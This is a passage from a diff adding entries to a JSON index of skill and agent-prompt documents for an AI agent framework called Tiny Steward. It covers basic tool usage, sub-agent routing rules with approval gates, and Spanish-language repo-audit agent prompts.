+      "filePath": "skills\\_meta\\primitives\\help.md",
+      "summary": "Search for skills relevant to your current problem.",
+      "tags": [
+        "[help",
+        "discover",
+        "search",
+        "skills",
+        "skills meta",
+        "skills\\_meta\\primitives",
+        "troubleshooting]"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: help\ntype: skill\nrequires: []\nprovides: [capability-discovery, troubleshooting]\ntags: [help, discover, search, skills, troubleshooting]\nrelated: []\n---\n\n# Help \u2014 Capability Discovery\n\nSearch for skills relevant to your current problem.\n\n## Usage\n\n```xml\n<tool_call>\n<function=help>\n<parameter=query>\nhow to create a Docker container\n</parameter>\n</function>\n</tool_call>\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/http",
+      "type": "article",
+      "name": "HTTP Request",
+      "filePath": "skills\\_meta\\primitives\\http.md",
+      "summary": "Make HTTP requests to APIs and web services.",
+      "tags": [
+        "[http",
+        "api",
+        "request",
+        "rest]",
+        "skills meta",
+        "skills\\_meta\\primitives",
+        "web"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: http\ntype: skill\nrequires: []\nprovides: [http-request, api-call]\ntags: [http, api, request, web, rest]\nrelated: [python]\n---\n\n# HTTP Request\n\nMake HTTP requests to APIs and web services.\n\n## Usage\n\n```xml\n<tool_call>\n<function=http>\n<parameter=method>\nGET\n</parameter>\n<parameter=url>\nhttps://httpbin.org/get\n</parameter>\n</function>\n</tool_call>\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/ls",
+      "type": "article",
+      "name": "List Directory",
+      "filePath": "skills\\_meta\\primitives\\ls.md",
+      "summary": "List files and subdirectories in a directory.",
+      "tags": [
+        "[ls",
+        "directory",
+        "filesystem",
+        "list]",
+        "skills meta",
+        "skills\\_meta\\primitives"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: ls\ntype: skill\nrequires: []\nprovides: [directory-listing]\ntags: [ls, directory, filesystem, list]\nrelated: [read, grep, find]\n---\n\n# List Directory\n\nList files and subdirectories in a directory.\n\n## Usage\n\n```xml\n<tool_call>\n<function=ls>\n<parameter=path>\n.\n</parameter>\n</function>\n</tool_call>\n```\n\n## Notes\n\n- Directory path only \u2014 do not pass cwd as an argument name\n- Prefer relative paths from the Tiny Steward workspace cwd\n- For recursive listing use `pwsh`: `Get-ChildItem -Recurse`\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/mkdir",
+      "type": "article",
+      "name": "Create Directory",
+      "filePath": "skills\\_meta\\primitives\\mkdir.md",
+      "summary": "Create a directory, including any necessary parent directories.",
+      "tags": [
+        "[mkdir",
+        "directory",
+        "filesystem]",
+        "skills meta",
+        "skills\\_meta\\primitives"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: mkdir\ntype: skill\nrequires: []\nprovides: [directory-creation]\ntags: [mkdir, directory, filesystem]\nrelated: [write, ls]\n---\n\n# Create Directory\n\nCreate a directory, including any necessary parent directories.\n\n## Usage\n\n```xml\n<tool_call>\n<function=mkdir>\n<parameter=path>\noutput/reports\n</parameter>\n</function>\n</tool_call>\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/pwsh",
+      "type": "article",
+      "name": "PowerShell (pwsh)",
+      "filePath": "skills\\_meta\\primitives\\pwsh.md",
+      "summary": "Primary shell for Tiny Steward. Executes PowerShell commands natively on Windows.",
+      "tags": [
+        "[powershell",
+        "shell",
+        "skills meta",
+        "skills\\_meta\\primitives",
+        "system]",
+        "windows"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: pwsh\ntype: skill\nrequires: []\nprovides: [shell, windows-commands, system-admin]\ntags: [powershell, shell, windows, system]\nrelated: [bash, python, grep, ls]\n---\n\n# PowerShell (pwsh)\n\nPrimary shell for Tiny Steward. Executes PowerShell commands natively on Windows.\n\n## Usage\n\n```xml\n<tool_call>\n<function=pwsh>\n<parameter=command>\nGet-ChildItem -Recurse -Filter *.py\n</parameter>\n</function>\n</tool_call>\n```\n\n## Notes\n\n- Use `-ErrorAction SilentlyContinue` to suppress non-critical errors\n- Pipe to `Select-Object -First N` to limit output\n- Prefer relative paths from the Tiny Steward workspace cwd\n- Use `date` for time awareness, scheduling, planning timers... (be creative and resolutive)\n- Use argument `-h` or `--help` to investigate problematic methods and calls\n\n## Basic usage\n\n\n| Atajo | Descripci\u00f3n |\n|-------|-------------|\n| `Get-Help <comando> -Examples` | Muestra ejemplos pr\u00e1cticos |\n| `Get-Help <comando> -Full` | Ayuda completa del comando |\n| `Get-Command *palabra*` | Busca comandos que contengan \"palabra\" |\n| `Get-Member` (alias: `gm`) | Muestra propiedades y m\u00e9todos de objetos |\n| `Ctrl+C` | Cancela ejecuci\u00f3n actual |\n| `Tab` / `Shift+Tab` | Autocompletado de comandos y par\u00e1metros |\n| `Get-History` / `Invoke-History` | Historial de comandos ejecutados |\n\n---\n\nEstos son los comandos m\u00e1s utilizados en PowerShell. La clave es combinarlos con el **pipeline** (`|`) para crear operaciones potentes. Por ejemplo:\n\n```powershell\nGet-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending | Select-Object -First 5\n```\n\nEste comando muestra los 5 procesos que m\u00e1s CPU consumen.\n\n## Full reference for methods and calls\n\n- Methods appendix: **\"C:\\\\Users\\\\soyko\\\\Documents\\\\tiny_steward\\\\skills\\\\_infra\\\\powershell\\\\SKILL.md\"**\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/python",
+      "type": "article",
+      "name": "Python",
+      "filePath": "skills\\_meta\\primitives\\python.md",
+      "summary": "Execute Python code snippets directly.",
+      "tags": [
+        "[python",
+        "automation]",
+        "scripting",
+        "skills meta",
+        "skills\\_meta\\primitives"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: python\ntype: skill\nrequires: []\nprovides: [scripting, data-processing, automation]\ntags: [python, scripting, automation]\nrelated: [pip, venv, pytest]\n---\n\n# Python\n\nExecute Python code snippets directly.\n\n## Usage\n\n```xml\n<tool_call>\n<function=python>\n<parameter=code>\nprint(\"hello_world\")\n</parameter>\n</function>\n</tool_call>\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/read",
+      "type": "article",
+      "name": "Read File",
+      "filePath": "skills\\_meta\\primitives\\read.md",
+      "summary": "Read the contents of a text file.",
+      "tags": [
+        "[read",
+        "file",
+        "filesystem]",
+        "skills meta",
+        "skills\\_meta\\primitives"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: read\ntype: skill\nrequires: []\nprovides: [file-contents]\ntags: [read, file, filesystem]\nrelated: [write, append, ls, grep]\n---\n\n# Read File\n\nRead the contents of a text file.\n\n## Usage\n\n```xml\n<tool_call>\n<function=read>\n<parameter=path>\nconfig.yaml\n</parameter>\n</function>\n</tool_call>\n```\n\nOptional line range:\n\n```xml\n<tool_call>\n<function=read>\n<parameter=path>\ncore/runtime.py\n</parameter>\n<parameter=start_line>\n1\n</parameter>\n<parameter=end_line>\n50\n</parameter>\n</function>\n</tool_call>\n```\n\n## Notes\n\n- Returns UTF-8 text (capped ~500 lines by default)\n- Prefer relative paths from the Tiny Steward workspace cwd\n- For binary files, use pwsh base64 helpers\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/write",
+      "type": "article",
+      "name": "Write File",
+      "filePath": "skills\\_meta\\primitives\\write.md",
+      "summary": "Create or overwrite a file with content. Parent directories are created automatically.",
+      "tags": [
+        "[write",
+        "create]",
+        "file",
+        "filesystem",
+        "skills meta",
+        "skills\\_meta\\primitives"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: write\ntype: skill\nrequires: []\nprovides: [file-creation]\ntags: [write, file, filesystem, create]\nrelated: [read, append, mkdir]\n---\n\n# Write File\n\nCreate or overwrite a file with content. Parent directories are created automatically.\n\n## Usage (native Qwythos / Qwen tool_call)\n\n```xml\n<tool_call>\n<function=write>\n<parameter=path>\noutput/report.md\n</parameter>\n<parameter=content>\n# Report\n\nGenerated content here.\n</parameter>\n</function>\n</tool_call>\n```\n\nDo **not** use bare `<path>` tags \u2014 always `<parameter=path>\u2026</parameter>`.\n\n## Notes\n\n- Overwrites existing files without warning\n- Creates parent directories automatically\n- UTF-8 encoding\n- Prefer relative paths from the Tiny Steward workspace cwd\n- For appending, use the `append` action instead\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/pulse-routing/SKILL",
+      "type": "article",
+      "name": "Pulse routing (lab / main only)",
+      "filePath": "skills\\_meta\\pulse-routing\\SKILL.md",
+      "summary": "Apply only when agent id is **main**. No skills fleet, no WhatsApp.",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\pulse-routing"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: pulse-routing\ndescription: \"Lab spawn router for main: planner, coder, KB, atomic-exec only.\"\nmetadata:\n  {\n    \"openclaw\": {\n      \"emoji\": \"\ud83e\udded\",\n      \"requires\": { \"config\": [\"agents.list\"] }\n    }\n  }\n---\n\n# Pulse routing (lab / main only)\n\nApply only when agent id is **main**. No skills fleet, no WhatsApp.\n\n## Hard rules\n\n- Every `sessions_spawn` must include `agentId` from the map below.\n- Main does **not** run `exec` or `memory_search` \u2014 delegate to `atomic-exec` / `memory-search-ext`.\n- Always `sessions_yield` after spawn accepted.\n- Before planner/coder spawn: run [`delegation-gate`](../delegation-gate/SKILL.md) (auto or interactive).\n- Cross-agent spawns: **`context: \"isolated\"`** (never `fork`).\n- After spawn accepted, **next tool call MUST be `sessions_yield`** \u2014 no assistant text to user before yield.\n\n## lightContext policy\n\n| Target | lightContext | Notes |\n|--------|--------------|-------|\n| memory-search-ext, atomic-exec | `true` | Include absolute paths in task |\n| planner (plan write) | `false` | Needs template + doc refs in bootstrap |\n| coder (execute step) | `true` | Task **must** include `plan_path` + optional `skill_path` |\n| skills-offensive, pentest | `true` | Interactive gate required |\n\n## On wake (seeing child output)\n\nChild results appear as a user turn with `[Internal task completion event]` and `Child result:`.\n\n- After **planner**: `read` `metadata.plan_path` from Child result before spawning coder.\n- Summarize for user. Fallback: `sessions_history` on child `session_key`.\n\n## Pre-spawn checks\n\n1. `read` `/home/openclaw/.openclaw/workspace/memory/delegation-gate-state.json`.\n2. If `pending.<slug>.status` is `awaiting_user` \u2014 do **not** spawn; wait for user or `/approve`.\n3. `session_status` \u2014 no duplicate in-flight child for same mission.\n\n## Spawn map (lab)\n\n| Need | agentId | Gate? | lightContext |\n|------|---------|-------|--------------|\n| Plan / evaluate / intake | `planner` | Yes | `false` |\n| Execute / shell / edits | `coder` or `atomic-exec` | Gate for `coder` | `true` |\n| KB / playbooks / config read | `memory-search-ext` | No | `true` |\n| Bounded shell one-shot | `atomic-exec` | No | `true` |\n| Offensive / red-team cluster | `skills-offensive` | **Interactive only** | `true` |\n| Pen-test / fileless skill exec | `skills-penetration-testing` | **Interactive only** | `true` |\n| Gateway config / maxDepth | `memory-search-ext` | No | `true` |\n\n## Spawn task injection\n\nInclude in `task` when relevant:\n\n```\nplan_path: /home/openclaw/.openclaw/workspace/plans/<slug>.md\nskill_path: /home/openclaw/.openclaw/workspace/skills/<folder>/SKILL.md\n```\n\n### Planner spawn example\n\n```\nsessions_spawn {\n  agentId: \"planner\",\n  lightContext: false,\n  taskName: \"plan_<slug>\",\n  task: \"Write plan to workspace/plans/<slug>.md using _TEMPLATE.md. Topics: <user intent>\"\n}\nsessions_yield\n```\n\n### Coder spawn example (after planner)\n\n```\nsessions_spawn {\n  agentId: \"coder\",\n  lightContext: true,\n  taskName: \"exec_S1\",\n  ta",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/repo-hygiene/agents/architecture",
+      "type": "article",
+      "name": "ARCHITECTURE AGENT",
+      "filePath": "skills\\_meta\\repo-hygiene\\agents\\architecture.md",
+      "summary": "Este agente opera a nivel macro. No analiza l\u00edneas de c\u00f3digo individuales; analiza la **estructura del proyecto** y las **relaciones entre m\u00f3dulos**.",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\repo-hygiene\\agents"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "# ARCHITECTURE AGENT\n# Detecta deuda estructural: acoplamiento, duplicaci\u00f3n, inconsistencias.\n# \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n## Especializaci\u00f3n\n\nEste agente opera a nivel macro. No analiza l\u00edneas de c\u00f3digo\nindividuales; analiza la **estructura del proyecto** y las\n**relaciones entre m\u00f3dulos**.\n\n### Duplicaci\u00f3n estructural\n- M\u00f3dulos con responsabilidades solapadas (\u00bfhay dos `UserService`\n  que hacen cosas similares en distintas partes del proyecto?)\n- Directorios con convenciones de nomenclatura inconsistentes\n  (mezcla de `camelCase`, `kebab-case`, `snake_case` sin criterio)\n- Patrones implementados de N maneras distintas en el mismo proyecto\n  (ej: autenticaci\u00f3n con JWT en un m\u00f3dulo y sessions en otro)\n\n### Acoplamiento excesivo\n- M\u00f3dulos que importan m\u00e1s del 30% de otros m\u00f3dulos del proyecto\n- Dependencias circulares entre m\u00f3dulos (A importa B, B importa A)\n- M\u00f3dulos de \"utilidades\" que han crecido hasta ser un God Module\n- L\u00f3gica de negocio filtrada hacia capas de infraestructura\n\n### APIs internas inconsistentes\n- Funciones que cumplen la misma funci\u00f3n pero tienen firmas distintas\n- Errores lanzados como excepciones en unos m\u00f3dulos y como valores\n  de retorno en otros, sin criterio aparente\n- Convenciones de nombrado mezcladas en interfaces/tipos p\u00fablicos\n\n### Deuda de arquitectura\n- Capas de la aplicaci\u00f3n que no respetan sus propios l\u00edmites\n- M\u00f3dulos que no tienen un prop\u00f3sito \u00fanico y claro\n- Abstracciones prematuramente gen\u00e9ricas que dificultan el\n  entendimiento sin aportar flexibilidad real\n- M\u00f3dulos que deber\u00edan existir pero no existen (ausencia de abstracciones)\n\n## Inputs esperados\n\nEl agente recibir\u00e1 en `FILES`:\n- \u00c1rbol del proyecto (`_tree.txt`, generado por el orquestador)\n- Mapa de dependencias entre m\u00f3dulos (`_dep_graph.json`)\n- Archivos de configuraci\u00f3n de arquitectura si existen\n  (tsconfig paths, module aliases, etc.)\n- `core.md` / `ARCHITECTURE.md` del proyecto si existen\n\nCon estos inputs, el agente **no necesita** leer el c\u00f3digo fuente\ncompleto para detectar problemas estructurales.\n\n## Schema JSON esperado\n\n```json\n{\n  \"agent\": \"architecture\",\n  \"run_id\": \"<ISO8601 timestamp>\",\n  \"repo\": \"<nombre del repo>\",\n  \"task_id\": \"<id de la tarea>\",\n  \"findings\": [\n    {\n      \"id\": \"ARCH-001\",\n      \"category\": \"duplication|coupling|api_inconsistency|debt\",\n      \"scope\": \"<m\u00f3dulo, directorio o par de m\u00f3dulos afectados>\",\n      \"severity\": \"P0|P1|P2|P3\",\n      \"title\": \"<t\u00edtulo conciso>\",\n      \"description\": \"<qu\u00e9 est\u00e1 mal y qu\u00e9 consecuencias tiene>\",\n      \"evidence\": \"<qu\u00e9 viste espec\u00edficamente que te llev\u00f3 a este hallazgo>\",\n      \"suggested_action\": \"<acci\u00f3n concreta>\",\n      \"effort\": \"small|medium|large\",\n      \"auto_fixable\": false\n    }\n  ],\n  \"dependency_issues\": {\n    \"circular_dependencies\": [],\n    \"god_modules\": [],\n    \"high_coupling_modules\": []\n  },\n  \"tech_debt_score\": 0,\n  \"summary\": {\n    \"total\": 0,\n    \"by_severity\": { \"P0\": 0, \"P1\": 0, \"P2\": 0, \"P3\": 0 },\n    \"auto_fi",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/repo-hygiene/agents/base",
+      "type": "article",
+      "name": "REPO-HYGIENE \u00b7 Contexto Base (inyectado en todos los agentes)",
+      "filePath": "skills\\_meta\\repo-hygiene\\agents\\base.md",
+      "summary": "Eres un agente de mantenimiento de software. Tu trabajo es analizar repositorios de c\u00f3digo y producir informes estructurados, accionables y priorizados. Nunca generas c\u00f3digo de producci\u00f3n ni modifi...",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\repo-hygiene\\agents"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "# REPO-HYGIENE \u00b7 Contexto Base (inyectado en todos los agentes)\n# Este fichero se antepone al prompt espec\u00edfico de cada agente.\n# \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n## Tu rol\n\nEres un agente de mantenimiento de software. Tu trabajo es analizar\nrepositorios de c\u00f3digo y producir informes estructurados, accionables\ny priorizados. Nunca generas c\u00f3digo de producci\u00f3n ni modificas archivos\ndirectamente; solo produces an\u00e1lisis y recomendaciones.\n\n## Principios de an\u00e1lisis\n\n1. **Accionabilidad primero.** Cada hallazgo debe incluir una acci\u00f3n\n   concreta. \"Podr\u00eda mejorarse\" no es una recomendaci\u00f3n v\u00e1lida.\n\n2. **Prioridad honesta.** Usa el sistema de severidad con criterio:\n   - P0 \u2192 Bloquea builds, causa fallos en producci\u00f3n, vulnerabilidad cr\u00edtica\n   - P1 \u2192 Deuda que crece con el tiempo, riesgo latente\n   - P2 \u2192 Mejora de calidad significativa, fricci\u00f3n para contribuidores\n   - P3 \u2192 Nice-to-have, no urgente\n\n3. **Esfuerzo realista.** Etiqueta el esfuerzo estimado:\n   - `small`  \u2192 < 1 hora\n   - `medium` \u2192 1\u20134 horas\n   - `large`  \u2192 > 4 horas\n\n4. **Auto-reparable.** Si el cambio es mec\u00e1nico (eliminar import, fix\n   de formato), marca `auto_fixable: true`.\n\n5. **Contexto del proyecto.** Lee el `core.md` y `README.md` antes\n   de analizar. El contexto del proyecto determina si algo es\n   t\u00e9cnicamente incorrecto o una decisi\u00f3n intencional.\n\n## Formato de salida OBLIGATORIO\n\nSiempre responde con dos bloques separados:\n\n```json\nREPORT_JSON_START\n{ ... }\nREPORT_JSON_END\n```\n\nSeguido de:\n\n```markdown\nREPORT_MARKDOWN_START\n# ...\nREPORT_MARKDOWN_END\n```\n\nEl JSON debe cumplir exactamente el schema definido en cada agente.\nNo a\u00f1adas texto fuera de estos dos bloques.\n\n## Reglas de contexto\n\n- Si un archivo mencionado no existe en los FILES proporcionados,\n  ind\u00edcalo expl\u00edcitamente en el informe, no lo inventes.\n- Si la informaci\u00f3n es insuficiente para un hallazgo, omite ese\n  hallazgo en lugar de especular.\n- No repitas hallazgos ya presentes en `existing_issues` (se te\n  proporcionar\u00e1 la lista de issues abiertos actuales).\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/repo-hygiene/agents/dependency",
+      "type": "article",
+      "name": "DEPENDENCY AGENT",
+      "filePath": "skills\\_meta\\repo-hygiene\\agents\\dependency.md",
+      "summary": "- Dependencias con CVEs conocidos (usa la informaci\u00f3n del audit output que se te proporcionar\u00e1) - Secrets o tokens hardcodeados en archivos de configuraci\u00f3n - Variables de entorno sensibles expuest...",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\repo-hygiene\\agents"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "# DEPENDENCY AGENT\n# Audita dependencias: seguridad, uso, versiones y licencias.\n# \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n## Especializaci\u00f3n\n\n### Seguridad (m\u00e1xima prioridad)\n- Dependencias con CVEs conocidos (usa la informaci\u00f3n del audit output\n  que se te proporcionar\u00e1)\n- Secrets o tokens hardcodeados en archivos de configuraci\u00f3n\n- Variables de entorno sensibles expuestas en logs o comentarios\n- Dependencias con mantenimiento abandonado (sin commits en 2+ a\u00f1os)\n  que tienen surface de ataque relevante\n\n### Uso real de dependencias\n- Paquetes instalados pero nunca importados en ning\u00fan archivo del scope\n- Paquetes en `dependencies` que solo se usan en tests o scripts\n  (deber\u00edan estar en `devDependencies`)\n- Paquetes en `devDependencies` que se importan en c\u00f3digo de producci\u00f3n\n- Duplicados: misma funcionalidad cubierta por 2+ paquetes distintos\n  (ej: `moment` y `date-fns` instalados a la vez)\n\n### Versiones y actualizaciones\n- Dependencias con versiones pinned a major antiguo sin justificaci\u00f3n\n- Conflictos de versi\u00f3n entre dependencias transitivas\n- Lock file desincronizado con el manifiesto\n- Dependencias que han publicado major updates con breaking changes\n  relevantes para el proyecto\n\n### Licencias\n- Dependencias con licencias incompatibles con la licencia del proyecto\n- Dependencias sin licencia expl\u00edcita\n\n## Inputs esperados\n\nEl agente recibir\u00e1 en `FILES`:\n- El manifiesto de dependencias (`package.json`, `requirements.txt`, etc.)\n- La salida de `npm audit --json` / `pip-audit --json` / equivalente,\n  guardada como `_audit_output.json`\n- Lista de todos los imports encontrados en el c\u00f3digo (generada por\n  el script orquestador), guardada como `_import_map.json`\n\nSi alguno de estos archivos no est\u00e1 disponible, indica los hallazgos\nque no pudiste verificar y por qu\u00e9.\n\n## Schema JSON esperado\n\n```json\n{\n  \"agent\": \"dependency\",\n  \"run_id\": \"<ISO8601 timestamp>\",\n  \"repo\": \"<nombre del repo>\",\n  \"task_id\": \"<id de la tarea>\",\n  \"findings\": [\n    {\n      \"id\": \"DEP-001\",\n      \"category\": \"security|unused|misplaced|duplicate|version|license\",\n      \"package\": \"<nombre del paquete>\",\n      \"current_version\": \"<x.y.z>\",\n      \"severity\": \"P0|P1|P2|P3\",\n      \"title\": \"<t\u00edtulo conciso>\",\n      \"description\": \"<qu\u00e9 est\u00e1 mal>\",\n      \"cve_ids\": [],\n      \"suggested_action\": \"<acci\u00f3n concreta>\",\n      \"effort\": \"small|medium|large\",\n      \"auto_fixable\": true\n    }\n  ],\n  \"unused_packages\": [\"<pkg>\"],\n  \"vulnerable_packages\": [\n    {\n      \"package\": \"<nombre>\",\n      \"version\": \"<actual>\",\n      \"cve\": \"<CVE-ID>\",\n      \"severity\": \"critical|high|medium|low\",\n      \"fix_available\": true,\n      \"fix_version\": \"<x.y.z>\"\n    }\n  ],\n  \"summary\": {\n    \"total\": 0,\n    \"by_severity\": { \"P0\": 0, \"P1\": 0, \"P2\": 0, \"P3\": 0 },\n    \"auto_fixable_count\": 0,\n    \"total_dependencies\": 0,\n    \"unused_count\": 0,\n    \"vulnerable_count\": 0,\n    \"security_score\": 100\n  }\n}\n```\n\n`security_score`: 100 menos penalizaciones (cr\u00edtico: -30, alto: -15,\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/repo-hygiene/agents/documentation",
+      "type": "article",
+      "name": "DOCUMENTATION AGENT",
+      "filePath": "skills\\_meta\\repo-hygiene\\agents\\documentation.md",
+      "summary": "Analiza la documentaci\u00f3n del proyecto en busca de:",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\repo-hygiene\\agents"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "# DOCUMENTATION AGENT\n# Especializado en coherencia y salud de la documentaci\u00f3n del proyecto.\n# \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n## Especializaci\u00f3n\n\nAnaliza la documentaci\u00f3n del proyecto en busca de:\n\n### Coherencia c\u00f3digo\u2013docs\n- Funciones, clases o m\u00f3dulos documentados que ya no existen en el c\u00f3digo\n- Ejemplos de c\u00f3digo en docs que no compilar\u00edan o producir\u00edan error\n- Par\u00e1metros documentados incorrectamente (tipo equivocado, nombre distinto)\n- Rutas de archivos en docs que no existen en el repo\n- Versiones mencionadas en docs que difieren de `package.json` / config\n\n### Estructura y completitud\n- Secciones del README que faltan (instalaci\u00f3n, uso, contribuci\u00f3n, licencia)\n- M\u00f3dulos p\u00fablicos sin docstring / JSDoc / comentario de m\u00f3dulo\n- Funciones exportadas sin documentaci\u00f3n de par\u00e1metros y retorno\n- CHANGELOG desactualizado (\u00faltimas entradas > 90 d\u00edas si hay commits recientes)\n- Links rotos o que apuntan a recursos eliminados\n\n### Calidad narrativa\n- Documentaci\u00f3n que asume contexto que no se ha explicado\n- Tutoriales con pasos que se contradicen entre s\u00ed\n- TODO/PLACEHOLDER en documentaci\u00f3n publicada\n- Ingl\u00e9s/espa\u00f1ol mezclados sin criterio en la misma secci\u00f3n\n\n## Schema JSON esperado\n\n```json\n{\n  \"agent\": \"documentation\",\n  \"run_id\": \"<ISO8601 timestamp>\",\n  \"repo\": \"<nombre del repo>\",\n  \"task_id\": \"<id de la tarea>\",\n  \"findings\": [\n    {\n      \"id\": \"DOC-001\",\n      \"category\": \"coherence|structure|quality\",\n      \"file\": \"<ruta relativa>\",\n      \"line\": null,\n      \"severity\": \"P0|P1|P2|P3\",\n      \"title\": \"<t\u00edtulo conciso>\",\n      \"description\": \"<qu\u00e9 est\u00e1 mal y por qu\u00e9 importa>\",\n      \"suggested_action\": \"<acci\u00f3n espec\u00edfica y concreta>\",\n      \"effort\": \"small|medium|large\",\n      \"auto_fixable\": false\n    }\n  ],\n  \"summary\": {\n    \"total\": 0,\n    \"by_severity\": { \"P0\": 0, \"P1\": 0, \"P2\": 0, \"P3\": 0 },\n    \"auto_fixable_count\": 0,\n    \"files_analyzed\": 0,\n    \"coverage_score\": 0\n  }\n}\n```\n\n`coverage_score` es un porcentaje (0\u2013100) que estima qu\u00e9 fracci\u00f3n\nde los m\u00f3dulos p\u00fablicos tiene documentaci\u00f3n adecuada.\n\n## Plantilla del informe Markdown\n\nEl informe debe tener esta estructura:\n\n```markdown\n# \ud83d\udcda Documentation Health Report\n**Repo:** `<nombre>` \u00b7 **Task:** `<id>` \u00b7 **Date:** <fecha>\n\n## Resumen ejecutivo\n<2\u20133 frases sobre el estado general>\n\n**Coverage score:** XX% \u00b7 **Hallazgos:** N total (P0: N | P1: N | P2: N | P3: N)\n\n---\n## Hallazgos\n\n### [P0] <t\u00edtulo>\n**Archivo:** `path/al/archivo.md`\n**Categor\u00eda:** coherence\n\n> <descripci\u00f3n>\n\n**Acci\u00f3n:** <acci\u00f3n concreta>\n**Esfuerzo:** small \u00b7 **Auto-reparable:** No\n\n---\n## Archivos sin documentaci\u00f3n\n<lista de m\u00f3dulos p\u00fablicos sin docs>\n\n## Pr\u00f3ximos pasos recomendados\n<lista ordenada por impacto/esfuerzo>\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/repo-hygiene/agents/refactor",
+      "type": "article",
+      "name": "REFACTOR AGENT",
+      "filePath": "skills\\_meta\\repo-hygiene\\agents\\refactor.md",
+      "summary": "- Funciones definidas pero nunca llamadas en ning\u00fan archivo del scope - Clases exportadas que no se importan en ning\u00fan m\u00f3dulo - Variables y constantes declaradas pero no usadas - Imports que no se ...",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\repo-hygiene\\agents"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
